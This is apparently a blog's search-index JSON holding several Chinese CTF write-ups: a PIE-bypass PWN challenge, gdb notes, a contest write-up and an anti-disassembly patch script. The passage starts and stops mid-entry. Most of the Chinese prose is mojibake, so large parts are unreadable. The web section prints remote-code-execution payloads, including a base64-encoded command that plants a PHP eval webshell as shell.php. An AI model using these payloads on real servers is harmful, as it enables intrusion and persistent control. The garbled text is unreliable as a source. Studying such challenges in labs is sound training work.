è€Œå¯¹å­—ç¬¦ä¸²çš„æ“ä½œæ˜¯æ“ä½œäº†30ä½çš„ï¼ˆ0åˆ°29ï¼‰ï¼Œæ‰€ä»¥æœ€åä¸€ä½å¯èƒ½éœ€è¦æˆ‘ä»¬çŒœæµ‹ï¼ŒæŠŠæ¯ä¸ªå­—æ¯éƒ½ çŒœä¸€éï¼ˆå¯ä»¥ç”¨ä»£ç å†™ï¼Œç”¨å­—ç¬¦ä¸²æ‹¼æ¥å‡½æ•°ï¼‰ æœ€ç»ˆflagï¼š 1flag&#123;ThisisthreadofwindowshahaIsESE&#125;","categories":[],"tags":[{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"çŒœæ•°","slug":"çŒœæ•°","permalink":"http://example.com/tags/%E7%8C%9C%E6%95%B0/"}]},{"title":"[NISACTF 2022]ezpie","slug":"NISACTF-2022-ezpie","date":"2025-07-16T05:35:49.000Z","updated":"2025-07-16T07:49:11.027Z","comments":true,"path":"2025/07/16/NISACTF-2022-ezpie/","permalink":"http://example.com/2025/07/16/NISACTF-2022-ezpie/","excerpt":"","text":"å¼€å¯äº†pieä¿æŠ¤ ä½†ç¨‹åºä¼šè¾“å‡ºmainå‡½æ•°çš„åœ°å€ ä¸”ç¨‹åºä¸­å­˜åœ¨bin&#x2F;shæ®µ åˆå› ä¸ºè™½ç„¶ PIE å¼€å¯åç¨‹åºåŸºåœ°å€éšæœºåŒ–ï¼Œä½†å‡½æ•°ä¹‹é—´çš„ ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ æ‰€ä»¥å¯ä»¥é€šè¿‡è®¡ç®—mainå’Œsystemå‡½æ•°ä¹‹é—´çš„åç§»é‡æ¥å¾—åˆ°systemå‡½æ•°çš„åœ°å€ ğŸ” æ–¹æ³•ä¸€ï¼šä½¿ç”¨ readelf -s æŸ¥çœ‹ç¬¦å·è¡¨ å¦‚æœç¨‹åºæœ‰ç¬¦å·ä¿¡æ¯ï¼ˆå³æœª stripï¼‰ï¼Œå¯ä»¥ç”¨ï¼š 1readelf -s + your_binary â€‹ 5: 0000000000000678 34 FUNC GLOBAL DEFAULT 11 main â€‹ 6: 0000000000000700 20 FUNC GLOBAL DEFAULT 11 system system_offset_from_main &#x3D; 0x700 - 0x678 &#x3D; 0x88 ä½†å¯¹äºè¿™é“é¢˜ç›®ï¼Œç¨‹åºè¢« strip æ‰äº†ç¬¦å·ï¼Œæ‰¾ä¸åˆ°systemå‡½æ•°çš„åœ°å€ ğŸ§  æ–¹æ³•äºŒï¼šç”¨ GDB åŠ¨æ€è°ƒè¯•ï¼ˆé€‚ç”¨äºæ²¡æœ‰ç¬¦å·çš„æƒ…å†µï¼‰ å¦‚æœä½ çš„ç¨‹åºè¢« strip æ‰äº†ç¬¦å·ï¼Œæ— æ³•ç”¨ readelf æ‰¾åˆ° main å’Œ system çš„åœ°å€ï¼Œå¯ä»¥ç”¨ GDB åŠ¨æ€è°ƒè¯•ï¼š æ­¥éª¤å¦‚ä¸‹ï¼š å¯åŠ¨ GDB å¹¶åŠ è½½ç¨‹åºï¼š bash 1 gdb .&#x2F;your_binary æŸ¥çœ‹ main åœ°å€ï¼š gdb 1 p main è¾“å‡ºç¤ºä¾‹ï¼š 1 $1 &#x3D; {int (int, char **, char **)} 0x555555555678 æŸ¥çœ‹ system åœ°å€ï¼š gdb 1 p system è¾“å‡ºç¤ºä¾‹ï¼š 1 $2 &#x3D; {&lt;text variable, no debug info&gt;} 0x555555555700 è®¡ç®—åç§»ï¼š 1 0x555555555700 - 0x555555555678 &#x3D; 0x88 æ‰€ä»¥åç§»è¿˜æ˜¯ 0x88ã€‚ ğŸ›  æ–¹æ³•ä¸‰ï¼šç”¨ IDA Pro &#x2F; Ghidra æŸ¥çœ‹å‡½æ•°åœ°å€åœ¨åæ±‡ç¼–å·¥å…·ä¸­æŸ¥çœ‹ï¼š æ‰¾åˆ° main å‡½æ•°èµ·å§‹åœ°å€ï¼ˆæ¯”å¦‚ sub_1234ï¼‰ æ‰¾åˆ° system å‡½æ•°åœ°å€ï¼ˆå¯èƒ½åœ¨ .plt æˆ– .got.plt ä¸­ï¼‰ è®¡ç®—ä¸¤è€…ä¹‹é—´çš„å·®å€¼å³å¯ ğŸ§ª å®æˆ˜åº”ç”¨æµç¨‹æ€»ç»“å‡è®¾ä½ åœ¨è¿œç¨‹è¿æ¥ä¸­å¾—åˆ°äº† main çš„è¿è¡Œæ—¶åœ°å€ä¸º 0x7ffff7a55678ï¼Œä½ æƒ³è°ƒç”¨ system(&quot;/bin/sh&quot;)ã€‚ æ­¥éª¤ï¼š æœ¬åœ°æŸ¥å‡ºï¼š main åç§»ä¸º 0x678 system åç§»ä¸º 0x700 æ‰€ä»¥ system_offset_from_main = 0x88 è¿œç¨‹æ³„éœ²å¾—åˆ°çš„ main_runtime_address = 0x7ffff7a55678 è®¡ç®— system_runtime_addressï¼š python 1 system_addr &#x3D; main_addr + system_offset_from_main å³ï¼š python 1 system_addr &#x3D; 0x7ffff7a55678 + 0x88 &#x3D; 0x7ffff7a55700 è¿™æ ·ä½ å°±æ‹¿åˆ°äº† system çš„åœ°å€ï¼ ğŸ“Œ è¡¥å……è¯´æ˜ å¦‚æœ system ä¸åœ¨ .text æ®µè€Œæ˜¯ PLT&#x2F;GOTï¼Œä½ éœ€è¦ä½¿ç”¨ GOT æ³„éœ²æ¥è·å–å…¶çœŸå®åœ°å€ã€‚ æœ¬æ–¹æ³•åªé€‚ç”¨äº system æ˜¯é™æ€é“¾æ¥è¿›ç¨‹åºä¸­çš„æƒ…å†µï¼ˆå³æ²¡æœ‰ strip æ‰ï¼Œæˆ–ä½ æœ‰ç¬¦å·ä¿¡æ¯ï¼‰ã€‚ å¦‚æœé¢˜ç›®æ²¡æœ‰è¾“å‡ºä»»ä½•åœ°å€æ³„éœ²ï¼Œä½ éœ€è¦è‡ªå·±æ„é€ æ³„éœ²æ–¹å¼ï¼ˆå¦‚åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€æ ˆæº¢å‡ºè¯»å–è¿”å›åœ°å€ç­‰ï¼‰ã€‚","categories":[],"tags":[{"name":"NSS","slug":"NSS","permalink":"http://example.com/tags/NSS/"},{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"gdbè°ƒè¯•","slug":"æ§åˆ¶å‘½ä»¤","date":"2025-07-16T03:04:42.000Z","updated":"2025-07-17T11:58:00.123Z","comments":true,"path":"2025/07/16/æ§åˆ¶å‘½ä»¤/","permalink":"http://example.com/2025/07/16/%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/","excerpt":"","text":"TABï¼šæ˜¾ç¤ºæ‰€æœ‰å‘½ä»¤ start:è¿è¡Œåˆ°ç¨‹åºå…¥å£å¤„ run:è¿è¡Œå®Œæ•´ä¸ªç¨‹åº ğŸ” x å‘½ä»¤çš„åŸºæœ¬è¯­æ³•ï¼šx&#x2F;nfs address n ï¼šè¦æ˜¾ç¤ºçš„å†…å­˜å•å…ƒä¸ªæ•°ï¼ˆé»˜è®¤æ˜¯ 1ï¼‰ã€‚ f ï¼šæ˜¾ç¤ºæ ¼å¼ï¼ˆformatï¼‰ï¼Œæ¯”å¦‚åå…­è¿›åˆ¶ã€åè¿›åˆ¶ã€å­—ç¬¦ä¸²ç­‰ã€‚ s ï¼šå†…å­˜å•å…ƒå¤§å°ï¼ˆsizeï¼‰ï¼Œæ¯”å¦‚å­—èŠ‚ã€åŠå­—ã€å­—ç­‰ã€‚ address ï¼šè¦æŸ¥çœ‹çš„å†…å­˜åœ°å€ï¼ˆå¯ä»¥æ˜¯å˜é‡åã€å¯„å­˜å™¨ã€æŒ‡é’ˆè¡¨è¾¾å¼ç­‰ï¼‰ã€‚ fï¼šè¾“å‡ºæ ¼å¼ï¼ˆformatï¼‰ x Hexï¼ˆåå…­è¿›åˆ¶ï¼‰ d Decimalï¼ˆåè¿›åˆ¶ï¼‰ u Unsigned decimal o Octalï¼ˆå…«è¿›åˆ¶ï¼‰ t Binaryï¼ˆäºŒè¿›åˆ¶ï¼‰ f Floating pointï¼ˆæµ®ç‚¹æ•°ï¼‰ a Addressï¼ˆåœ°å€ï¼Œæ˜¾ç¤ºæŒ‡é’ˆï¼‰ i Instructionï¼ˆåæ±‡ç¼–æŒ‡ä»¤ï¼‰ c Charï¼ˆå­—ç¬¦ï¼‰ s Stringï¼ˆå­—ç¬¦ä¸²ï¼‰ sï¼šå†…å­˜å•å…ƒå¤§å°ï¼ˆsizeï¼‰ b byteï¼ˆå­—èŠ‚ï¼‰ 1 å­—èŠ‚ h halfwordï¼ˆåŠå­—ï¼‰ 2 å­—èŠ‚ w wordï¼ˆå­—ï¼‰ 4 å­—èŠ‚ g giant wordï¼ˆåŒå­—ï¼‰ 8 å­—èŠ‚ ğŸ§  ç¤ºä¾‹ç”¨æ³• 1.æŸ¥çœ‹åœ°å€ 0x7fffffffe000 å¤„çš„ 4 ä¸ª 4 å­—èŠ‚æ•°å€¼ï¼Œä»¥åå…­è¿›åˆ¶æ˜¾ç¤ºï¼š 1x/4wx 0x7fffffffe000 è¾“å‡º 10x7fffffffe000: 0x00000001 0x00007fff 0x00000000 0x00000000 2. æŸ¥çœ‹åœ°å€ 0x400500 å¤„çš„ 5 æ¡æ±‡ç¼–æŒ‡ä»¤ï¼š 1x/5i 0x400500 è¾“å‡º 123450x400500: push %rbp0x400501: mov %rsp,%rbp0x400504: sub $0x10,%rsp0x400508: mov %edi,-0x4(%rbp)0x40050b: mov %rsi,-0x10(%rbp) 3. æŸ¥çœ‹æ ˆé¡¶æŒ‡é’ˆ rsp åœ°å€çš„å†…å®¹ï¼ˆä»¥ 8 å­—èŠ‚ä¸ºå•ä½ï¼Œæ˜¾ç¤ºä¸ºåå…­è¿›åˆ¶ï¼‰ï¼š 1x/gx $rsp è¾“å‡º 1x/gx $rsp 4. æŸ¥çœ‹åœ°å€ 0x7fffffffe010 å¼€å§‹çš„å­—ç¬¦ä¸²ï¼š 1x/s 0x7fffffffe010 è¾“å‡º 10x7fffffffe010: &quot;Hello, world!&quot; 5.æŸ¥çœ‹åœ°å€ 0x601038 çš„ 10 ä¸ªå­—èŠ‚ï¼Œä»¥åè¿›åˆ¶å½¢å¼æ˜¾ç¤ºï¼š 1x/10db 0x601038 è¾“å‡º 10x601038: 72 101 108 108 111 44 32 119 111 114 :small_airplane:æ¥æ”¶æ•°æ® å‡½æ•° è¯´æ˜ recvall() æ¥æ”¶æ‰€æœ‰æ•°æ®ç›´åˆ° EOF recvline() æ¥æ”¶ä¸€è¡Œï¼ˆä»¥\\nç»“å°¾ï¼‰ recvuntil(delim) æ¥æ”¶æ•°æ®ç›´åˆ°é‡åˆ°æŒ‡å®šåˆ†éš”ç¬¦ï¼ˆå¦‚&quot;Welcome!&quot;ï¼‰ recvregex(regex) æ¥æ”¶æ•°æ®ç›´åˆ°åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ recv(n) æ¥æ”¶æŒ‡å®šå­—èŠ‚æ•°çš„æ•°æ®ï¼ˆé˜»å¡ç›´åˆ°æ”¶åˆ° n å­—èŠ‚ï¼‰","categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"}]},{"title":"å¾¡ç½‘æ¯çº¿ä¸‹2025","slug":"å¾¡ç½‘æ¯2025çº¿ä¸‹","date":"2025-07-14T13:48:44.000Z","updated":"2025-07-20T10:10:43.524Z","comments":true,"path":"2025/07/14/å¾¡ç½‘æ¯2025çº¿ä¸‹/","permalink":"http://example.com/2025/07/14/%E5%BE%A1%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8B/","excerpt":"","text":"re_c FLAG:flag{HNCTFmng1} re_python å¾—åˆ° è„šæœ¬ 12345678910c = [144, 163, 158, 177, 121, 39, 58, 58, 91, 111, 25, 158, 72, 53, 152, 78, 171, 12, 53, 105, 45, 12, 12, 53, 12, 171, 111, 91, 53, 152, 105, 45, 152, 144, 39, 171, 45, 91, 78, 45, 158, 8]flag=&quot;&quot;for i in range(42): for j in range (128): if j * 33 % 179 == c[i]: flag+=chr(j)print(flag)#flag&#123;2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca&#125; å†æ›¿æ¢ä¸€ä¸‹ crypto1 æ”¾åˆ°éšæ³¢é€æµé‡Œé¢èƒ½çœ‹åˆ°Rot13è§£ç ä¹‹åæ˜¯æ˜æ˜¾çš„16è¿›åˆ¶ç¼–ç å½¢å¼ ç»è¿‡16è¿›åˆ¶è½¬å­—ç¬¦åç‰¹å¾å¾ˆæ˜æ˜¾ï¼Œæœ€åBase32-&gt;Base64-&gt;Ascii85æ··åˆè§£ç å¾—åˆ°flagã€‚ Crypto_10çœ‹åˆ°é¢˜ç›®æè¿°é‡æ’æ—¶åº 62æ˜ŸåºçŒœæµ‹å€’åºå’ŒBase62ã€‚ å€’åºï¼š Base62è§£ç ï¼š cryptoè§£å‹è¿™ä¸ªæ–‡ä»¶å¤¹æ‰“å¼€ä¸‹è½½çš„é™„ä»¶ï¼Œæœ‰ä¸€ä¸ªå‹ç¼©åŒ…å’Œä¸€å¼ å›¾ç‰‡ã€‚ç›´æ¥è§£å‹æ–‡ä»¶å¤¹éœ€è¦å¯†ç ï¼Œå›¾ç‰‡ä¹Ÿä¸èƒ½ç›´æ¥æ‰“å¼€ã€‚ å›¾ç‰‡ç”¨010æ‰“å¼€å‘ç°æ–‡ä»¶å¤´æ˜¯é”™çš„ä¿®æ”¹ä¸€ä¸‹ï¼Œå¾—åˆ°è§£å‹å¯†ç ã€‚ å‹ç¼©åŒ…è§£å‹å¾—åˆ°flag.jpgç›´æ¥æ”¾éšæ³¢é€æµé‡Œç„¶åbase64è§£ç ã€‚ å¾—åˆ°ctf_you_passedåŒ…è£¹flag{}å°±æ˜¯æœ€åçš„flagã€‚ crypto encryption21234567891011121314151617181920212223242526272829303132333435from secret import init1,init2,init3,FLAGimport hashlibassert(FLAG==&quot;flag&#123;&quot;+hashlib.sha256(init1+init2+init3).hexdigest()+&quot;&#125;&quot;)classlfsr(): def__init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**(length+1)-1 defnext(self): nextdata = (self.init &lt;&lt; 1) &amp; self.lengthmask i = self.init &amp; self.mask &amp; self.lengthmask output = 0 while i != 0: output ^= (i &amp; 1) i = i &gt;&gt; 1 nextdata ^= output self.init = nextdata return outputdefcombine(x1,x2,x3): return (x1*x2)^(x2*x3)^(x1*x3)if __name__==&quot;__main__&quot;: l1 = lfsr(int.from_bytes(init1,&quot;big&quot;),0b100000000000000000000000010000000000000000000000,48) l2 = lfsr(int.from_bytes(init2,&quot;big&quot;),0b100000000000000000000000000000000010000000000000,48) l3 = lfsr(int.from_bytes(init3,&quot;big&quot;),0b100000100000000000000000000000000000000000000000,48) withopen(&quot;keystream&quot;,&quot;wb&quot;) as f: for i inrange(8192): b = 0 for j inrange(8): b = (b&lt;&lt;1)+combine(l1.next(),l2.next(),l3.next()) f.write(chr(b).encode()) Misc1é¢˜ç›®é™„ä»¶æ˜¯ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œç›´æ¥çˆ†ç ´ã€‚ æ‰“å¼€æ–‡æ¡£å…¨é€‰å¤åˆ¶ ç²˜è´´ä¸€ä¸‹å°±èƒ½çœ‹åˆ°flag Misc2 é”®ç›˜æµé‡ Misc3 æ•°æ®åŒ…åˆ†æé™„ä»¶é‡Œçš„.exeæ˜¯å‹ç¼©åŒ…ï¼Œä¿®æ”¹åç¼€è§£å‹ã€‚ æ‰¾åˆ°æµé‡åŒ…å…¨å±€æœç´¢flagä»¥åŠflagå…¶ä»–ç¼–ç å½¢å¼ã€‚ 16è¿›åˆ¶è§£ç  Misc4å·¥ä¸šæµé‡åˆ†æ æŒ‰ç…§æ—¶é—´æ’åºï¼Œæœ€å…ˆSTOPçš„åŒ…ã€‚ 1flag&#123;ac6417423bb3000c&#125; web rceæ–¹æ³•ä¸€ï¼ˆæ‰“å°ç¼–ç çš„flagï¼‰1ip/?cmd=print(base64_encode(file_get_contents(base64_decode(&quot;ZmxhZy5waHA=&quot;)))); æ–¹æ³•äºŒï¼ˆå†™å…¥webshellï¼‰ç›´æ¥å†™å…¥ä¸€ä¸ªwebshell 1234file_put_contents( base64_decode(&quot;c2hlbGwucGhw&quot;), // &quot;shell.php&quot; base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==&quot;) // &quot;&lt;?php @eval(\\$_POST[x]); ?&gt;&quot;); è¿›è¡Œç¼–ç åä¸ºï¼š 1ip/?cmd=file_put_contents(base64_decode(&quot;c2hlbGwucGhw&quot;),base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hd web äºŒæ¬¡ç¼–ç ç›´æ¥è®¿é—®/flag.phpå°±å¯ä»¥å¾—åˆ°flag.php web sqlç›´æ¥ç”¨sqlmapã€‚","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"[HNCTF 2022 WEEK4]flower plus","slug":"HNCTF-2022-WEEK4-flower-plus","date":"2025-07-14T00:49:30.000Z","updated":"2025-07-14T06:53:00.725Z","comments":true,"path":"2025/07/14/HNCTF-2022-WEEK4-flower-plus/","permalink":"http://example.com/2025/07/14/HNCTF-2022-WEEK4-flower-plus/","excerpt":"","text":"é“¾æ¥ èŠ±æŒ‡ä»¤åˆ†æ å‘ç°èŠ±æŒ‡ä»¤ db 0C7h çš„â€œåƒåœ¾â€ä½œç”¨ï¼š 0x4012A6 å¤„çš„ db 0C7h æ˜¯ä¸€ä¸ªæ•°æ®å­—èŠ‚ã€‚å®ƒè¢« jnz æŒ‡ä»¤è·³è½¬åˆ°ï¼Œä½†å®ƒæœ¬èº«ä¸æ˜¯ä¸€ä¸ªæœ‰æ„ä¹‰çš„æ‰§è¡Œè·¯å¾„ã€‚å®ƒçš„å­˜åœ¨æ˜¯ä¸ºäº†å¹²æ‰°åæ±‡ç¼–å™¨çš„çº¿æ€§åˆ†æï¼Œä½¿å…¶è®¤ä¸ºè¿™é‡Œå­˜åœ¨ä¸€ä¸ªå®é™…çš„ä»£ç åˆ†æ”¯ã€‚åæ±‡ç¼–å™¨å¯èƒ½ä¼šå°† 0C7h è§£ç ä¸º MOV EDI, EBP (å¦‚æœåŠ ä¸Šå‰ç¼€çš„è¯)ï¼Œæˆ–è€…åªæ˜¯ä¸€ä¸ªæ•°æ®å­—èŠ‚ï¼Œæ— è®ºå“ªç§ï¼Œéƒ½ä¸æ­£å¸¸é€»è¾‘ä¸ç¬¦ã€‚ ä¸ºäº†ä¸å½±å“æ±‡ç¼–å™¨çš„åˆ†æ è¦æŠŠè¿™é‡Œè¿›è¡Œåˆ¤æ–­å’Œè·³è½¬çš„éƒ½NOPæ‰ å°† push ebx å’Œ pop ebx éƒ½ NOP æ‰çš„ä¸»è¦åŸå› æ˜¯ä¸ºäº†å®Œå…¨æ¶ˆé™¤è¿™ä¸ªèŠ±æŒ‡ä»¤çš„å‰¯ä½œç”¨å’Œæ··æ·†é“¾ï¼š æ ˆå¹³è¡¡ï¼š push ebx å’Œ pop ebx æ˜¯ä¸€å¯¹ç”¨æ¥ç»´æŠ¤æ ˆå¹³è¡¡çš„æ“ä½œã€‚å¦‚æœå®ƒä»¬æ˜¯èŠ±æŒ‡ä»¤çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸”å®ƒä»¬ä¿å­˜&#x2F;æ¢å¤çš„å¯„å­˜å™¨å€¼åœ¨ä¸­é—´è¢«ä¿®æ”¹ï¼ˆä¾‹å¦‚è¢« xor ebx, ebx æ¸…é›¶ï¼‰ï¼Œé‚£ä¹ˆè¿™å¯¹ push/pop å®é™…ä¸Šæ˜¯æ— æ•ˆçš„æˆ–è€…è¯´æ˜¯è¯¯å¯¼æ€§çš„ã€‚å®ƒä»¬çš„å­˜åœ¨åªæ˜¯ä¸ºäº†è®©ä»£ç çœ‹èµ·æ¥æ›´å¤æ‚ï¼Œæˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹é€šè¿‡ä¸åŒ¹é…çš„æ ˆæ“ä½œæ¥å¹²æ‰°åˆ†æã€‚ å¦‚æœåª NOP æ‰ä¸­é—´çš„è·³è½¬ï¼Œä¿ç•™ push ebx å’Œ pop ebxï¼Œé‚£ä¹ˆåœ¨ push ebx ä¹‹åï¼Œebx ç«‹å³è¢«æ¸…é›¶ï¼Œç„¶ååˆè¢« pop ebx æ¢å¤ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´ ebx çš„å€¼åœ¨å‡½æ•°ä¸­è¢«ä¸å¿…è¦åœ°æ”¹å˜å’Œæ¢å¤ï¼Œå³ä½¿å®ƒä¸æ˜¯çœŸæ­£éœ€è¦çš„ã€‚ ç¬¬äºŒä¸ªèŠ±æŒ‡ä»¤ æ‰§è¡Œ 0x401358: call loc_40135E: call æŒ‡ä»¤æœ¬èº«å ç”¨ 5 ä¸ªå­—èŠ‚ (E8 01 00 00 00)ã€‚ call æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ˜¯ 0x401358 + 5 = 0x40135Dã€‚ CPU å°† 0x40135D å‹å…¥æ ˆä¸­ã€‚æ­¤æ—¶ï¼Œ0x40135D å°±æ˜¯æ ˆé¡¶çš„è¿”å›åœ°å€ã€‚ CPU è·³è½¬åˆ° 0x40135E å¼€å§‹æ‰§è¡Œã€‚ æ‰§è¡Œ 0x40135E: db 36h: è¿™æ˜¯ä¸€ä¸ªæ•°æ®å­—èŠ‚ï¼Œä½†æ˜¯ CPU ä¼šå°è¯•å°†å…¶ä½œä¸ºæŒ‡ä»¤æ‰§è¡Œã€‚è¿™é€šå¸¸æ˜¯èŠ±æŒ‡ä»¤çš„æ··æ·†æ‰‹æ³•ï¼Œå®ƒå¯èƒ½ä¸ä¼šå¯¼è‡´å´©æºƒï¼Œè€Œæ˜¯ä½œä¸ºæ— æ•ˆæŒ‡ä»¤æ‰§è¡Œæˆ–è€…è¢«åç»­æŒ‡ä»¤è¦†ç›–ã€‚ å‡è®¾å®ƒè¢«æ‰§è¡Œäº†ï¼Œæˆ–è€…è¢«è·³è¿‡äº†ï¼Œç¨‹åºæµä¼šç»§ç»­åˆ° 0x40135Fã€‚ æ‰§è¡Œ 0x40135F: add dword ptr [esp], 8: è¿™æ¡æŒ‡ä»¤éå¸¸å…³é”®ã€‚ [esp] æŒ‡çš„æ˜¯æ ˆé¡¶çš„å†…å­˜åœ°å€ã€‚å½“å‰æ ˆé¡¶å­˜æ”¾çš„æ˜¯ 0x40135Dï¼ˆåŸå§‹è¿”å›åœ°å€ï¼‰ã€‚ add dword ptr [esp], 8 çš„ä½œç”¨æ˜¯ï¼šå°†æ ˆé¡¶å­˜æ”¾çš„é‚£ä¸ª dword å€¼ï¼ˆå³ 0x40135Dï¼‰åŠ ä¸Š 8ï¼Œç„¶åæŠŠç»“æœå†å†™å›æ ˆé¡¶ã€‚ æ‰€ä»¥ï¼Œæ ˆé¡¶çš„è¿”å›åœ°å€ä» 0x40135D å˜æˆäº† 0x40135D + 8 = 0x401365ã€‚ æ‰§è¡Œ 0x401362: retn: retn æŒ‡ä»¤ä¼šä»æ ˆé¡¶å¼¹å‡ºåœ°å€ã€‚ å®ƒå¼¹å‡ºçš„ä¸å†æ˜¯åŸå§‹çš„ 0x40135Dï¼Œè€Œæ˜¯è¢« add æŒ‡ä»¤ä¿®æ”¹åçš„ 0x401365ã€‚ CPU è·³è½¬åˆ° 0x401365 å¼€å§‹æ‰§è¡Œã€‚ åŸå§‹çš„è¿”å›åœ°å€æ˜¯ 0x40135Dã€‚å¦‚æœæ²¡æœ‰ä»»ä½• add æ“ä½œï¼Œretn ä¼šå›åˆ° 0x40135Dã€‚ ä½†æ˜¯ï¼Œadd dword ptr [esp], 8 å°†è¿”å›åœ°å€ä¿®æ”¹æˆäº† 0x401365ã€‚ è¿™æ„å‘³ç€å½“ retn æ‰§è¡Œæ—¶ï¼Œç¨‹åºä¼šç›´æ¥ä» 0x401365 å¼€å§‹æ‰§è¡Œï¼Œ æ‰€ä»¥ï¼Œadd dword ptr [esp], 8 çš„ä½œç”¨å°±æ˜¯äººä¸ºåœ°è°ƒæ•´äº† retn çš„ç›®æ ‡åœ°å€ï¼Œä½¿å…¶è·³è¿‡äº† 0x40135D åˆ° 0x401364ï¼ˆåŒ…å« 0x401364ï¼‰è¿™æ®µåŒºåŸŸï¼Œç›´æ¥è·³è½¬åˆ° 0x401365 å»æ‰§è¡Œã€‚ è¿™å°±æ˜¯è¿™ç§èŠ±æŒ‡ä»¤ç”¨äºæ··æ·†æ§åˆ¶æµçš„ä¸€ç§å¸¸è§æ‰‹æ³•ã€‚ æ‰€ä»¥NOPçš„èŒƒå›´åŒ…æ‹¬0x401364 ä¸ºä»€ä¹ˆæ˜¯èŠ±æŒ‡ä»¤ æ­£å¸¸æƒ…å†µä¸‹ï¼Œcall æŒ‡ä»¤ä¼šç›´æ¥è·³è½¬åˆ°è¢«è°ƒç”¨å‡½æ•°çš„å…¥å£ç‚¹ã€‚è¿™ä¸ªå…¥å£ç‚¹åº”è¯¥æ˜¯ä¸€æ¡åˆæ³•çš„å¯æ‰§è¡ŒæŒ‡ä»¤ã€‚ ä½†æ˜¯åœ¨è¿™é‡Œï¼Œå½“ call æŒ‡ä»¤è·³è½¬åˆ° 0x40135E æ—¶ï¼Œå®ƒé‡åˆ°çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ db 36hã€‚ åæ±‡ç¼–å™¨å›°æƒ‘ï¼š é™æ€åæ±‡ç¼–å™¨åœ¨ 0x40135E çœ‹åˆ° db 36h æ—¶ï¼Œé€šå¸¸ä¼šè®¤ä¸ºè¿™æ˜¯æ•°æ®ï¼Œè€Œä¸æ˜¯ä»£ç ã€‚å®ƒå¯èƒ½å› æ­¤åœæ­¢å¯¹è¯¥åŒºåŸŸçš„ä»£ç åˆ†æï¼Œæˆ–è€…äº§ç”Ÿé”™è¯¯çš„è§£ç ã€‚ CPU è¡Œä¸ºï¼š CPU ä¼šå°è¯•å°† 36h ä½œä¸ºæŒ‡ä»¤æ¥è§£ç æ‰§è¡Œã€‚å¦‚å‰æ‰€è¿°ï¼Œ36h æ˜¯ä¸€ä¸ªæ®µè¶…è¶Šå‰ç¼€ï¼ˆSS:ï¼‰ã€‚CPU ä¼šå°è¯•å°†å…¶ä¸éšåçš„å­—èŠ‚ç»„åˆæˆä¸€æ¡æŒ‡ä»¤ã€‚ å¦‚æœ 36h åé¢è·Ÿç€çš„å­—èŠ‚ï¼ˆå³ add dword ptr [esp], 8 çš„å­—èŠ‚ç  83ï¼‰ä¸èƒ½ä¸ 36h å½¢æˆä¸€æ¡åˆæ³•çš„æŒ‡ä»¤ï¼Œæˆ–è€…å½¢æˆäº†ç¨‹åºå‘˜ä¸æœŸæœ›çš„æŒ‡ä»¤ï¼Œè¿™å°±ä¼šå¯¼è‡´ç¨‹åºè¡Œä¸ºå¼‚å¸¸æˆ–å´©æºƒã€‚ ç„¶è€Œï¼Œåœ¨æŸäº›å¤æ‚çš„æ··æ·†ä¸­ï¼Œå¯èƒ½ä¼šåˆ©ç”¨è¿™ç§å‰ç¼€çš„ç‰¹æ€§ï¼Œä½¿å¾—å¤„ç†å™¨åœ¨ç‰¹å®šä¸Šä¸‹æ–‡ä¸­èƒ½æ­£ç¡®æ‰§è¡Œï¼Œè€Œåæ±‡ç¼–å™¨å´éš¾ä»¥ç†è§£ã€‚ callèŠ±æŒ‡ä»¤è¯†åˆ« call ç›®æ ‡æ˜¯æ•°æ®å­—èŠ‚æˆ–éæŒ‡ä»¤åŒºã€‚ call åé¢ç´§è·Ÿæ•°æ®å®šä¹‰ã€‚ call ç›®æ ‡å†…éƒ¨æœ‰ add dword ptr [esp], N æ¥ä¿®æ”¹è¿”å›åœ°å€ã€‚ æœ€åä»¥ retn ç»“æŸï¼Œå¹¶ä¸” retn ä¹‹åçš„å­—èŠ‚å¯èƒ½ä¹Ÿæ˜¯æ··æ·†çš„ä¸€éƒ¨åˆ†ã€‚ è„šæœ¬1234567891011121314stae=0x00401006end=0x00401402 for i in range(stae, end+1): if get_wide_dword(i)== 0x01740275: patch_dword(i,0x90909090) patch_dword(i-4,0x90909090) patch_word(i+4,0x9090) patch_word(i-5,0x90) if get_wide_dword(i)== 0x000001E8: if get_wide_dword(i+4)== 0x8336E800: patch_dword(i,0x90909090) patch_dword(i+4,0x90909090) patch_dword(i+8,0x90909090) patch_byte(i+12,0x90) ç„¶åé€‰ä¸­å‡½æ•°å¤´Uè§£æ„ Cé‡æ„ä¸€ä¸‹å°±å¥½ å°±å¯ä»¥çœ‹å¾…mainå‡½æ•°äº† åœ¨è¿™ä¸ªå‡½æ•°ä¸­çœ‹åˆ°RC4çš„æ ‡å¿— ä¹‹åç»è¿‡ä¸€ä¸ªå¼‚æˆ– ç„¶åè¿›å…¥sub_40128Fè¿›è¡Œæ ¸éªŒ è¿™æ˜¯å…¶åŠ å¯†åçš„å€¼ å³é”® æå–æ•°æ® å¼‚æˆ–è„šæœ¬ 123456789101112131415161718192021222324252627a=[0x0000004D, 0xFFFFFFE6, 0x00000049, 0xFFFFFF95, 0x00000003, 0x0000002D, 0x0000002B, 0xFFFFFFBA, 0xFFFFFFEA, 0x0000006D, 0xFFFFFFFF, 0x00000059, 0x00000070, 0x00000000, 0x0000001B, 0xFFFFFFA9, 0x0000002C, 0xFFFFFFB0, 0x00000032, 